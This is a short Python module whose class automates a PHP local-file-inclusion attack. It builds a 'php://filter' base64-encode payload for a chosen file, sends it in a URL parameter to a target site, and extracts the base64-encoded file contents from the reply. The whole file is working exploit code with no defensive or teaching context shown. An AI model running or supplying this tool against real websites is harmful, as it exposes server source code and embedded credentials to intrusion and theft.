import re
from typing import Optional
import requests

class Extractor:
    def __init__(self):
        pass

    def build_payload(self, resource: str) -> str:
        resource = resource.replace('.php', '')
        return f"php://filter/read=convert.base64-encode/resource={resource}"

    def extract_base64(self, html: str) -> Optional[str]:
        pattern = r'[A-Za-z0-9+/]{50,}={0,2}'
        matches = re.findall(pattern, html)
        return max(matches, key=len) if matches else None

    def fetch(self, url: str, param: str, payload: str) -> Optional[str]:
        base_url = url.split('?')[0]
        full_url = f"{base_url}?{param}={payload}"
        resp = requests.get(full_url, timeout=10)
        return resp.text if resp.status_code == 200 else None
